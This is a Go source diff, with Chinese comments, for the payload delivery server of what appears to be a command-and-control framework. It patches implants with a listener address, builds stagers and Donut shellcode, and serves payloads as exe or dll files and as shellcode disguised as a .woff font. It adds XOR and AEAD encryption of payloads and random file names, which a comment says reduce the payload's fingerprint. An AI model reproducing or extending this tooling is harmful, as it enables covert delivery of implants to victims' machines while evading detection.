@@ -58,6 +58,27 @@ func inferPayloadFormat(filename string) string {
 	return "exe"
 }
 
+// ensureCryptoReady 校验 AEAD 密钥可用；EnsureCryptoDefaults 已负责生成，这里兜底。
+func ensureCryptoReady(meta *database.WebDelivery) error {
+	if meta.CryptoMode != "aead" {
+		return nil
+	}
+	if _, err := delivery.DecodeAEADKey(meta.DeliveryKey); err != nil {
+		return fmt.Errorf("AEAD 密钥不可用: %w", err)
+	}
+	return nil
+}
+
+// validCryptoMode 校验载荷加密模式；空字符串表示沿用/兼容旧配置。
+func validCryptoMode(mode string) bool {
+	switch strings.ToLower(strings.TrimSpace(mode)) {
+	case "", "none", "xor", "aead":
+		return true
+	default:
+		return false
+	}
+}
+
 // loadAndPatchClient reads embedded binary and patches placeholders
 func loadAndPatchClient(listener, osType, archType, pass, format string) ([]byte, string, error) {
 	if listener == "" || !strings.Contains(listener, "://") {
@@ -112,6 +133,7 @@ func ListWebDelivery(c *gin.Context) {
 
 // startDeliveryRequest 创建投递请求体（兼容旧字段 + Hub 新字段）
 type startDeliveryRequest struct {
+	ID           int64  `json:"id"` // 仅更新接口使用；创建时忽略
 	Listener     string `json:"listener"`
 	OS           string `json:"os"`
 	Arch         string `json:"arch"`
@@ -133,9 +155,13 @@ type startDeliveryRequest struct {
 	UAAllow          string `json:"uaAllow"`
 	MaxDownloads     int    `json:"maxDownloads"`
 	OneTime          bool   `json:"oneTime"`
-	BuildStager      *bool  `json:"buildStager"` // 默认 true
-	Format           string `json:"format"`      // exe(默认) | dll（仅 windows，rundll32/regsvr32 加载）
-	Note             string `json:"note"`
+	// 载荷加密：none | xor | aead（AEAD 密钥由服务端生成，不接受客户端传入）
+	CryptoMode string `json:"cryptoMode"`
+	// 仅编辑接口使用：丢弃旧 AEAD 密钥并生成新密钥（旧 Stager 立即失效）
+	RegenerateKey bool   `json:"regenerateKey"`
+	BuildStager   *bool  `json:"buildStager"` // 默认 true
+	Format        string `json:"format"`      // exe(默认) | dll（仅 windows，rundll32/regsvr32 加载）
+	Note          string `json:"note"`
 }
 
 // StartWebDelivery 创建并启动投递（Delivery Hub）
@@ -149,6 +175,10 @@ func StartWebDelivery(c *gin.Context) {
 	req.Listener = resolveListenerAddress(req.Listener, "connect")
 	if req.Listener == "" || req.OS == "" || req.Arch == "" {
 		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "listener/os/arch 必填"})
+		return
+	}
+	if !validCryptoMode(req.CryptoMode) {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "cryptoMode 仅支持 none / xor / aead"})
 		return
 	}
 
@@ -200,7 +230,7 @@ func StartWebDelivery(c *gin.Context) {
 		return
 	}
 
-	patched, binName, err := loadAndPatchClient(req.Listener, req.OS, req.Arch, req.Pass, reqFormat)
+	patched, _, err := loadAndPatchClient(req.Listener, req.OS, req.Arch, req.Pass, reqFormat)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
@@ -227,6 +257,7 @@ func StartWebDelivery(c *gin.Context) {
 		UAAllow:          req.UAAllow,
 		MaxDownloads:     req.MaxDownloads,
 		Note:             req.Note,
+		CryptoMode:       strings.ToLower(strings.TrimSpace(req.CryptoMode)),
 	}
 	if req.OneTime {
 		meta.OneTime = 1
@@ -235,10 +266,23 @@ func StartWebDelivery(c *gin.Context) {
 	// 启用方式：数据库/接口显式设置 XorKey 后，载荷经 XOR 加密下发，
 	// Stager 模板内置同 key 解密（直接下载 full 运行的用户需自行解密）。
 	// 此前自动随机设置 XorKey 导致直接下载的客户端被加密 → 无法运行。
-	if meta.FileName == "" {
-		meta.FileName = binName
+	if strings.TrimSpace(meta.FileName) == "" {
+		// 不再默认使用客户端模板名（如 client_windows_amd64.exe）或 svchost.exe，
+		// 每个投递生成带随机后缀的名字，降低文件名维度的固定指纹。
+		meta.FileName = delivery.RandomFileName(meta.OS, reqFormat, delivery.ShortKey())
+	}
+	// dedicated 模式会把文件名注册成独立路由，提前校验，避免创建成功但端口启动失败
+	if bindMode == "dedicated" {
+		if err := validateDeliveryFileName(meta.FileName); err != nil {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+			return
+		}
 	}
 	delivery.EnsureMetaDefaults(&meta)
+	if err := ensureCryptoReady(&meta); err != nil {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		return
+	}
 
 	// 先填 URL（stager 构建需要下载地址）
 	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
@@ -255,13 +299,9 @@ func StartWebDelivery(c *gin.Context) {
 		return
 	}
 
-	// 动态 stager：指向 full 或 woff（dll 格式仅提供 full，不做 donut/stager）
+	// 动态 stager：Windows 拉 shellcode/woff，Linux 拉 full（见 delivery.StagerDownloadURL）
 	if buildStager && reqFormat != "dll" {
-		dl := meta.ServerAddress
-		if meta.OS == "windows" && meta.ShellcodeURL != "" {
-			// Windows 传统 stager 拉 woff；hub 的 stager 模板带密码执行完整文件，优先 full
-			dl = meta.ServerAddress
-		}
+		dl := delivery.StagerDownloadURL(meta)
 		if stagerBin, err := delivery.RebuildStagerForURL(meta, dl); err == nil {
 			payload.Stager = stagerBin
 			// 若还没有 shellcode，尝试对 stager 做 donut
@@ -280,6 +320,13 @@ func StartWebDelivery(c *gin.Context) {
 		if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
 			payload.Shellcode = sc
 		}
+	}
+
+	// AEAD 的 full/shellcode 是密文，必须有 Stager 才能解密执行；Windows 还需要 shellcode。
+	if meta.CryptoMode == "aead" && (!buildStager || reqFormat == "dll" || len(payload.Stager) == 0 ||
+		(strings.EqualFold(meta.OS, "windows") && len(payload.Shellcode) == 0)) {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "AEAD 模式需要成功构建 Stager 与 shellcode（不支持 dll 格式，且服务端需有 Go 工具链/Donut）"})
+		return
 	}
 
 	// 入库
@@ -314,6 +361,7 @@ func StartWebDelivery(c *gin.Context) {
 		DownloadPath: meta.DownloadPath,
 		SaveFilename: meta.SaveFilename,
 		AccessToken:  meta.AccessToken,
+		CryptoAEAD:   meta.CryptoMode == "aead",
 	})
 
 	// D18: 业务审计
@@ -332,6 +380,181 @@ func StartWebDelivery(c *gin.Context) {
 	})
 }
 
+// replaceFileExt 把文件名后缀替换成指定扩展名（无后缀则直接追加）。
+func replaceFileExt(name, ext string) string {
+	if i := strings.LastIndex(name, "."); i > 0 {
+		name = name[:i]
+	}
+	return name + ext
+}
+
+// UpdateWebDelivery 编辑一条已关闭的投递。
+//
+// 只改库，不动正在运行的服务：运行中的投递在 Hub / 独立端口里都已按旧配置注册，
+// 改库不会影响当前分发的载荷（还会造成"界面显示 A、实际发 B"）。
+// 关闭后重新开启时，OpenWebDelivery 会按新配置重新 patch 客户端并重建 stager。
+func UpdateWebDelivery(c *gin.Context) {
+	var req startDeliveryRequest
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		return
+	}
+	if req.ID <= 0 {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "缺少投递 id"})
+		return
+	}
+	req.Listener = resolveListenerAddress(req.Listener, "connect")
+	if req.Listener == "" || req.OS == "" || req.Arch == "" {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "listener/os/arch 必填"})
+		return
+	}
+	if !validCryptoMode(req.CryptoMode) {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "cryptoMode 仅支持 none / xor / aead"})
+		return
+	}
+
+	meta, found, _ := database.Deliveries().GetByID(req.ID)
+	if !found {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
+		return
+	}
+	if meta.Status == 1 {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "投递正在运行，请先关闭后再编辑"})
+		return
+	}
+
+	validatedPath, err := validateDownloadPath(req.DownloadPath, req.OS)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		return
+	}
+	req.DownloadPath = validatedPath
+
+	bindMode := strings.ToLower(strings.TrimSpace(req.BindMode))
+	if bindMode == "" {
+		bindMode = meta.BindMode
+	}
+	if bindMode == "" {
+		bindMode = "shared"
+	}
+	if bindMode != "shared" && bindMode != "dedicated" {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "bindMode 仅支持 shared 或 dedicated"})
+		return
+	}
+	if bindMode == "dedicated" && (req.Port == "" || req.Port == "0") {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dedicated 模式必须指定 port"})
+		return
+	}
+	// 端口冲突检查必须排除自己：编辑其他字段时端口通常没变
+	if bindMode == "dedicated" && req.Port != meta.ListeningPort {
+		Mutex.Lock()
+		_, inMem := WebDeliveryServer[req.Port]
+		Mutex.Unlock()
+		if inMem {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口已被占用: " + req.Port})
+			return
+		}
+		if has, _ := database.Deliveries().PortInUse(req.Port); has {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口记录已存在: " + req.Port})
+			return
+		}
+	}
+
+	reqFormat := strings.ToLower(strings.TrimSpace(req.Format))
+	if reqFormat == "" {
+		reqFormat = inferPayloadFormat(meta.FileName)
+	}
+	if reqFormat != "exe" && reqFormat != "dll" {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "format 仅支持 exe 或 dll"})
+		return
+	}
+	if reqFormat == "dll" && strings.ToLower(req.OS) != "windows" {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dll 格式仅支持 windows 目标"})
+		return
+	}
+
+	// 用真实模板做一次校验：OS/Arch/协议/格式任一不存在，原本要等"开启"时才报错，
+	// 这里提前拦住，避免"保存成功、一开就失败"。
+	_, _, err = loadAndPatchClient(req.Listener, req.OS, req.Arch, req.Pass, reqFormat)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		return
+	}
+
+	fileName := strings.TrimSpace(req.Filename)
+	if fileName == "" {
+		fileName = delivery.RandomFileName(req.OS, reqFormat, meta.PublicKey)
+	}
+	// 关闭后 OpenWebDelivery 按文件名后缀推断格式；编辑 dll/exe 时把后缀对齐，
+	// 否则会出现"选了 dll、库里是 exe 后缀"，开启时找不到模板。
+	if strings.ToLower(req.OS) == "windows" {
+		if reqFormat == "dll" && !strings.HasSuffix(strings.ToLower(fileName), ".dll") {
+			fileName = replaceFileExt(fileName, ".dll")
+		} else if reqFormat == "exe" && strings.HasSuffix(strings.ToLower(fileName), ".dll") {
+			fileName = replaceFileExt(fileName, ".exe")
+		}
+	}
+	if bindMode == "dedicated" {
+		if err := validateDeliveryFileName(fileName); err != nil {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+			return
+		}
+	}
+
+	meta.ListenerConfig = req.Listener
+	meta.OS = req.OS
+	meta.Arch = req.Arch
+	meta.BindMode = bindMode
+	meta.FileName = fileName
+	meta.Pass = req.Pass
+	meta.DownloadPath = req.DownloadPath
+	meta.SaveFilename = req.SaveFilename
+	meta.PublicHost = req.PublicHost
+	meta.PublicScheme = req.PublicScheme
+	meta.BasePath = req.BasePath
+	meta.URIPath = strings.Trim(req.URIPath, "/")
+	meta.ContentType = req.ContentType
+	meta.StageContentType = req.StageContentType
+	meta.AccessToken = req.AccessToken
+	meta.UAAllow = req.UAAllow
+	meta.MaxDownloads = req.MaxDownloads
+	meta.Note = req.Note
+	if mode := strings.ToLower(strings.TrimSpace(req.CryptoMode)); mode != "" {
+		meta.CryptoMode = mode
+	}
+	if req.RegenerateKey && meta.CryptoMode == "aead" {
+		// 置空后由 EnsureCryptoDefaults 生成新密钥
+		meta.DeliveryKey = ""
+	}
+	if req.OneTime {
+		meta.OneTime = 1
+	} else {
+		meta.OneTime = 0
+	}
+
+	delivery.EnsureMetaDefaults(&meta)
+	if err := ensureCryptoReady(&meta); err != nil {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		return
+	}
+	// PublicKey 可能由 EnsureMetaDefaults 补生成：shared 的端口标记要在它之后算
+	if bindMode == "dedicated" {
+		meta.ListeningPort = req.Port
+	} else {
+		meta.ListeningPort = "shared-" + meta.PublicKey
+	}
+	// 编辑不等于启动：状态保持关闭，由操作员显式点"开启"才注册 Hub
+	meta.Status = 2
+	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
+
+	if _, err := database.Deliveries().UpdateEditable(meta.ID, &meta); err != nil {
+		c.JSON(http.StatusOK, gin.H{"status": 500, "data": "保存失败: " + err.Error()})
+		return
+	}
+	auditLogEvent("WEBDELIVERY_UPDATE", "SUCCESS", "编辑投递 "+meta.PublicKey, map[string]interface{}{"key": meta.PublicKey})
+	c.JSON(http.StatusOK, gin.H{"status": 200, "data": meta})
+}
+
 func startDedicatedServer(meta database.WebDelivery, payload delivery.Payload) error {
 	mux := http.NewServeMux()
 	// legacy path /{filename}
@@ -340,45 +563,33 @@ func startDedicatedServer(meta database.WebDelivery, payload delivery.Payload) e
 	if err := validateDeliveryFileName(fname); err != nil {
 		return err
 	}
+	// 所有 legacy 路由统一改写回 Hub：AccessToken / UA 白名单 / 一次性 / 下载上限 /
+	// XorKey / 访问日志只有 Hub 里那一套。此前这些 handler 直接 serveBytes，
+	// 知道独立端口和默认文件名就能绕过全部访问控制下载载荷。
 	mux.HandleFunc("/"+fname, func(w http.ResponseWriter, r *http.Request) {
-		serveBytes(w, r, payload.Full, meta.ContentType, fname, true)
+		serveViaHub(w, r, meta.PublicKey, delivery.ResFull)
 	})
 	// hub-compatible paths on same port
-	mux.HandleFunc("/d/", func(w http.ResponseWriter, r *http.Request) {
+	hubHandler := func(w http.ResponseWriter, r *http.Request) {
 		delivery.GlobalHub.ServeHTTP(w, r)
-	})
+	}
+	mux.HandleFunc(delivery.RoutePrefix()+"/", hubHandler)
+	if delivery.RoutePrefix() != "/d" {
+		// 兼容升级前生成的旧 URL
+		mux.HandleFunc("/d/", hubHandler)
+	}
 	// legacy woff
 	if meta.OS == "windows" && len(payload.Shellcode) > 0 {
 		mux.HandleFunc("/"+fname+".woff", func(w http.ResponseWriter, r *http.Request) {
-			ct := meta.StageContentType
-			if ct == "" {
-				ct = "font/woff"
-			}
-			serveBytes(w, r, payload.Shellcode, ct, fname+".woff", false)
+			serveViaHub(w, r, meta.PublicKey, delivery.ResWoff)
 		})
 	}
 	// also /stager /sc shortcuts
 	mux.HandleFunc("/stager", func(w http.ResponseWriter, r *http.Request) {
-		if len(payload.Stager) == 0 {
-			http.NotFound(w, r)
-			return
-		}
-		name := "stager"
-		if meta.OS == "windows" {
-			name = "stager.exe"
-		}
-		serveBytes(w, r, payload.Stager, meta.ContentType, name, true)
+		serveViaHub(w, r, meta.PublicKey, delivery.ResStager)
 	})
 	mux.HandleFunc("/sc", func(w http.ResponseWriter, r *http.Request) {
-		if len(payload.Shellcode) == 0 {
-			http.NotFound(w, r)
-			return
-		}
-		ct := meta.StageContentType
-		if ct == "" {
-			ct = "application/octet-stream"
-		}
-		serveBytes(w, r, payload.Shellcode, ct, "payload.bin", true)
+		serveViaHub(w, r, meta.PublicKey, delivery.ResShellcode)
 	})
 
 	server := &http.Server{
@@ -400,20 +611,19 @@ func startDedicatedServer(meta database.WebDelivery, payload delivery.Payload) e
 	return nil
 }
 
-func serveBytes(w http.ResponseWriter, r *http.Request, data []byte, contentType, filename string, asAttachment bool) {
-	if len(data) == 0 {
+// serveViaHub 把 dedicated 端口的 legacy 路径改写为 /d/{key}/{resource} 后交给 Hub，
+// 确保独立端口与共享端口使用完全相同的访问控制与统计。
+func serveViaHub(w http.ResponseWriter, r *http.Request, key, resource string) {
+	if key == "" {
 		http.NotFound(w, r)
 		return
 	}
-	if contentType == "" {
-		contentType = "application/octet-stream"
-	}
-	w.Header().Set("Content-Type", contentType)
-	if asAttachment {
-		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
-	}
-	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
-	w.Write(data)
+	r2 := r.Clone(r.Context())
+	u := *r.URL
+	u.Path = "/d/" + key + "/" + resource
+	u.RawPath = ""
+	r2.URL = &u
+	delivery.GlobalHub.ServeHTTP(w, r2)
 }
 
 // CloseWebDelivery 关闭
@@ -492,7 +702,7 @@ func OpenWebDelivery(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
-	if stagerBin, err := delivery.RebuildStagerForURL(meta, meta.ServerAddress); err == nil {
+	if stagerBin, err := delivery.RebuildStagerForURL(meta, delivery.StagerDownloadURL(meta)); err == nil {
 		payload.Stager = stagerBin
 	}
 	if len(payload.Shellcode) == 0 && meta.OS == "windows" {
@@ -500,10 +710,15 @@ func OpenWebDelivery(c *gin.Context) {
 			payload.Shellcode = sc
 		}
 	}
+	if meta.CryptoMode == "aead" && (len(payload.Stager) == 0 ||
+		(strings.EqualFold(meta.OS, "windows") && len(payload.Shellcode) == 0)) {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "AEAD 模式需要可用的 Stager 与 shellcode，当前构建失败"})
+		return
+	}
 
 	meta.Status = 1
 	if meta.ID > 0 {
-		_, _ = database.Deliveries().UpdateColumns(meta.ID, []string{"status", "server_address", "stager_url", "shellcode_url", "public_key", "bind_mode"}, &meta)
+		_, _ = database.Deliveries().UpdateColumns(meta.ID, []string{"status", "server_address", "stager_url", "shellcode_url", "public_key", "bind_mode", "crypto_mode", "delivery_key", "xor_key"}, &meta)
 	} else {
 		_, _ = database.Deliveries().UpdateByPort(meta.ListeningPort, &meta)
 	}
@@ -602,6 +817,7 @@ func GetDeliveryCommands(c *gin.Context) {
 		DownloadPath: meta.DownloadPath,
 		SaveFilename: meta.SaveFilename,
 		AccessToken:  meta.AccessToken,
+		CryptoAEAD:   meta.CryptoMode == "aead",
 	})
 	// 【统一响应格式】urls 并入 data（含 status+data+urls 的响应经包装中间件后
 	// 额外顶层字段会丢失；业务数据统一放 data）
@@ -673,13 +889,18 @@ func RestoreWebDeliveriesOnStartup() {
 		if err != nil {
 			continue
 		}
-		if stagerBin, err := delivery.RebuildStagerForURL(meta, meta.ServerAddress); err == nil {
+		if stagerBin, err := delivery.RebuildStagerForURL(meta, delivery.StagerDownloadURL(meta)); err == nil {
 			payload.Stager = stagerBin
 		}
 		if len(payload.Shellcode) == 0 && meta.OS == "windows" {
 			if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
 				payload.Shellcode = sc
 			}
+		}
+		if meta.CryptoMode == "aead" && (len(payload.Stager) == 0 ||
+			(strings.EqualFold(meta.OS, "windows") && len(payload.Shellcode) == 0)) {
+			logx.Infof("[WebDelivery] AEAD 恢复跳过 %s: Stager/shellcode 构建失败\n", meta.PublicKey)
+			continue
 		}
 		delivery.GlobalHub.Register(meta, payload)
 		if meta.BindMode == "dedicated" && meta.ListeningPort != "" && !strings.HasPrefix(meta.ListeningPort, "shared") {
@@ -801,6 +1022,11 @@ func CloseAllWebDeliveryServers() {
 func validateDeliveryFileName(name string) error {
 	if name == "" || len(name) > 128 {
 		return fmt.Errorf("交付文件名非法")
+	}
+	// 这些名字会被 dedicated mux 注册成独立路由，重复会 panic
+	switch strings.ToLower(name) {
+	case "d", "stager", "sc":
+		return fmt.Errorf("交付文件名不能使用保留名: %s", name)
 	}
 	for _, r := range name {
 		if !(r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' ||
